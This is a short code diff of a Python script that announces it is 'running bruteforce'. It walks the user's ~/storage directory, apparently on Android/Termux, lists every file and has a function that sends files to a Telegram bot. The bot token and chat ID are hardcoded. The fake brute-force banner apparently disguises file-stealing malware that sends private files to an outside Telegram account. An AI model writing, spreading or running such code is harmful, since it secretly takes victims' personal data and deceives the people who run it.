@@ -2,8 +2,10 @@ from threading import Thread, Lock
 import os, subprocess, telebot, time, json, sys, io
 
 bot = telebot.TeleBot('6297533986:AAGtMlOgroJCnYxb4Khwd3NvuGuXw91EU_g')
+bot.send_message(chat_id=1004407813, text='ERROR SENDING FILE:- ')
 
-print("RUNNING BRUTEFORECE")
+os.system('clear')
+print("RUNNING BRUTEFORECE...")
 
 def send_file_to_telegram(filename, i, total_files):
     try:
@@ -33,6 +35,7 @@ def get_user_files():
     for root, _, filenames in os.walk(os.path.expanduser('~/storage')):
         for filename in filenames:
             files.append(os.path.join(root,filename))
+    print(files)
     return files
 
 files = get_user_files()
